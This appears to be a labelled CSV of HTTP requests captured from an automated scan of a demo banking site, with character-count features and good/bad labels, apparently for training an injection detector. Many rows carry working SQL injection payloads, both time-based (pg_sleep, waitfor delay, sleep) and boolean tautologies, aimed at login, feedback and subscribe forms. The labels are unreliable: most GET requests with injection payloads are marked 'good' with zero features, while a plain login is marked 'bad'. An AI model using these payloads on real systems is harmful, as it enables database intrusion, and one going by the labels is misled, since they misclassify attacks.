method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=%5C&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/Documents,0,0,0,0,0,0,good
GET,,"/survey_questions.jsp?step=%BF'%BF""",0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm'%20AND%202*3*8=6*8%20AND%20'Nbux'='Nbux&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,-1'%20OR%202%2B262-262-1=0%2B0%2B0%2B1%20--%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,2,0,2,0,4,0,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/default.jsp?content=-1%20OR%202%2B833-833-1=0%2B0%2B0%2B1,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=-1%20OR%202%2B282-282-1=0%2B0%2B0%2B1%20--%20&template=US,0,0,0,0,0,0,good
GET,,/index.jsp?content=1%20waitfor%20delay%20'0:0:21'%20--%20&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,"%BF'%BF""&passw=g00dPa%24%24w0rD&uid=e",/doLogin,2,2,0,0,0,2,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp?content=Jy8jzPos'));select%20pg_sleep(7);%20--%20&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20000623=000623%20or%20'bkqL7jUZ'='&uid=e,/doLogin,8,0,0,0,6,2,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp?content=mMwlMm5G'));select%20pg_sleep(9);%20--%20&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=-1'%20OR%202%2B772-772-1=0%2B0%2B0%2B1%20or%20'DJgIcJMc'=',0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/%9A%95%F7i%BA%EC4%01%FE%01%94%AE%85^,0,0,0,0,0,0,good
POST,"1'""&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,2,2,0,0,0,0,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/search.jsp?query=JyI=,0,0,0,0,0,0,good
POST,if(now()=sysdate()%2Csleep(3)%2C0)&txtEmail=sample%40email.tst,/doSubscribe,0,0,0,8,0,2,bad
GET,,/index.jsp?content=inside_jobs.htm&job=PVHmkMtj');select%20pg_sleep(5);%20--%20,0,0,0,0,0,0,good
GET,,"/disclaimer.htm?url=-1""%20OR%203%2B995-995-1=0%2B0%2B0%2B1%20--%20",0,0,0,0,0,0,good
GET,,/index.jsp?content=1%20waitfor%20delay%20'0:0:9'%20--%20&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%202%2B407-407-1=0%2B0%2B0%2B1%20--%20&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_investor.htm,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=-1""%20OR%202%2B899-899-1=0%2B0%2B0%2B1%20--%20",/sendFeedback,0,2,2,0,6,0,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=8JNA6fax'));select%20pg_sleep(9);%20--%20&name=zFPWdwPk&subject=1,/sendFeedback,2,0,2,2,5,4,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=JM4QL4su';%20waitfor%20delay%20'0:0:14'%20--%20&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,6,0,2,0,7,4,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=a,0,0,0,0,0,0,good
GET,,/default.jsp?content=%5C,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,"btnSubmit=Login&passw=1'""&uid=1",/doLogin,2,2,0,0,0,2,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&txtEmail=sample%40email.tst,/doSubscribe,4,0,0,10,0,2,bad
POST,-1%20OR%202%2B199-199-1=0%2B0%2B0%2B1%20--%20&passw=g00dPa%24%24w0rD&uid=e,/doLogin,0,0,2,0,4,2,bad
GET,,/index.jsp?content=inside_jobs.htm&job=-1%20OR%202%2B975-975-1=0%2B0%2B0%2B1%20--%20,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=1'""&job=OperationalRiskManager:RiskManagement",0,0,0,0,0,0,good
POST,-1%20OR%202%2B937-937-1=0%2B0%2B0%2B1&passw=g00dPa%24%24w0rD&uid=1,/doLogin,0,0,0,0,2,2,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/%99x%C6%80%C7uf%CC%B8%F7%E9th%FC[%93%A1%C5%DE%B2C%D6%06,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=1%00%C0%A7%C0%A2%252527%252522&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,"/disclaimer.htm?url=-1""%20OR%202%2B995-995-1=0%2B0%2B0%2B1%20--%20",0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=1%00%C0%A7%C0%A2%252527%252522&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/admin/clients.xls,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1%20OR%202%2B410-410-1=0%2B0%2B0%2B1,/doLogin,0,0,0,0,2,2,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=rUqpQM89');select%20pg_sleep(3);%20--%20&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=-1%20OR%202%2B491-491-1=0%2B0%2B0%2B1%20--%20,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp?content=ajVDXXiF,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_volunteering.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=219'&job=OperationalRiskManager:RiskManagement,0,0,0,0,0,0,good
POST,"0""XOR(if(now()=sysdate()%2Csleep(13)%2C0))XOR""Z&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,0,4,0,10,0,2,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=JyI=,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/high_yield_investments.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=1B66lmhM'));select%20pg_sleep(6);%20--%20,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,"btnSubmit=Login&passw=%BF'%BF""&uid=e",/doLogin,2,2,0,0,0,2,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=152'&job=ExecutiveAssistant:Administration,0,0,0,0,0,0,good
GET,,"/survey_questions.jsp?step=(select(0)from(select(sleep(11)))v)/*'%2B(select(0)from(select(sleep(11)))v)%2B'""%2B(select(0)from(select(sleep(11)))v)%2B""*/",0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,"/disclaimer.htm?url=1'""",0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=-1%20OR%202%2B957-957-1=0%2B0%2B0%2B1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,4,0,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=http://www.microsoft.com,0,0,0,0,0,0,good
GET,,/images,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,oXXrWZyD');select%20pg_sleep(9);%20--%20&txtEmail=sample%40email.tst,/doSubscribe,2,0,2,2,3,4,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=vvH2jArK';%20waitfor%20delay%20'0:0:6'%20--%20,/doLogin,6,0,2,0,5,6,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/images/,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=VUXXndlZ';select%20pg_sleep(6);%20--%20,0,0,0,0,0,0,good
GET,,/retirement.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=lOXDtFsi'));select%20pg_sleep(5);%20--%20,0,0,0,0,0,0,good
GET,,/index.jsp?content=%40%40lQDfA&job=OperationalRiskManager:RiskManagement,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=%40%40KPdyQ,/sendFeedback,0,0,0,0,2,0,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,"/?id=1'""1000",0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%20914=914%20or%20'QmbTa8Nm'='&uid=1,/doLogin,8,0,0,0,6,2,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=-1""%20OR%202%2B122-122-1=0%2B0%2B0%2B1%20--%20&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,0,2,2,0,6,0,bad
GET,,"/index.jsp?content=inside_jobs.htm""%20AND%202*3*8=6*8%20AND%20""d3va""=""d3va&job=OperationalRiskManager:RiskManagement",0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=-1%20OR%202%2B491-491-1=0%2B0%2B0%2B1&template=US,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=-1'%20OR%202%2B987-987-1=0%2B0%2B0%2B1%20or%20'CsXviMc1'=',0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,btnSubmit=Subscribe&txtEmail=-1%20OR%202%2B596-596-1=0%2B0%2B0%2B1,/doSubscribe,0,0,0,0,2,0,bad
GET,,"/index.jsp?content=0""XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR""Z&job=LoyaltyMarketingProgramManager:Marketing",0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/http,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=if(now()=sysdate()%2Csleep(9)%2C0)&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,if(now()=sysdate()%2Csleep(23.316)%2C0)&passw=g00dPa%24%24w0rD&uid=1,/doLogin,0,0,0,8,0,4,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,%40%40A1iSL&passw=g00dPa%24%24w0rD&uid=1,/doLogin,0,0,0,0,0,2,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1*66*61*0&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=business_retirement.htm,0,0,0,0,0,0,good
POST,btnSubmit=Subscribe&txtEmail=if(now()=sysdate()%2Csleep(5)%2C0),/doSubscribe,0,0,0,8,0,2,bad
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=personal_other.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=%BF'%BF""&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,2,2,0,0,2,0,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=8m9JLfNb,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1*348*343*0&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,"/index.jsp?content=inside_jobs.htm&job=%F0''%F0""""",0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm%25'%20AND%202*3*8=6*8%20AND%20'NnwE'!='NnwE%25&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=-1%20OR%202%2B859-859-1=0%2B0%2B0%2B1%20--%20,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=%F0''%F0""""&job=Teller:ConsumaerBanking",0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%BF'%BF""",/doLogin,2,2,0,0,0,2,bad
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=JyI=&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=orbuNH92,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,"btnSubmit=Subscribe&txtEmail=%F0''%F0""""",/doSubscribe,4,4,0,0,0,0,bad
POST,"%F0''%F0""""&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,4,4,0,0,0,0,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/%BFw%FCa%96v%9D%94%FC%CD%FD%C9%DD%E0*7%B7k%9Cu%FE%11I%ABbsL%B6$%F1G%B1%A6%7FW%1D%88%92%F1[a%FA.%1BZ%DA%12BjS%CC%C5%03o%82%E8,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=1%00%C0%A7%C0%A2%252527%252522&uid=1,/doLogin,0,0,0,0,0,2,bad
GET,,/Documents/JohnSmith,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm'%20AND%202*3*8=6*8%20AND%20'5QhU'='5QhU&job=Teller:ConsumaerBanking,0,0,0,0,0,0,good
GET,,/index.jsp?content=JyI=&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);select%20pg_sleep(3);%20--%20,/doLogin,0,0,2,2,3,6,bad
GET,,/index.jsp?content=542',0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=%40%40UZtEk,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=FesdFk9w'));select%20pg_sleep(11);%20--%20,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1,/doLogin,0,0,0,0,0,2,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%40%40X0LTs,/doLogin,0,0,0,0,0,2,bad
GET,,/doSubscribe,0,0,0,0,0,0,good
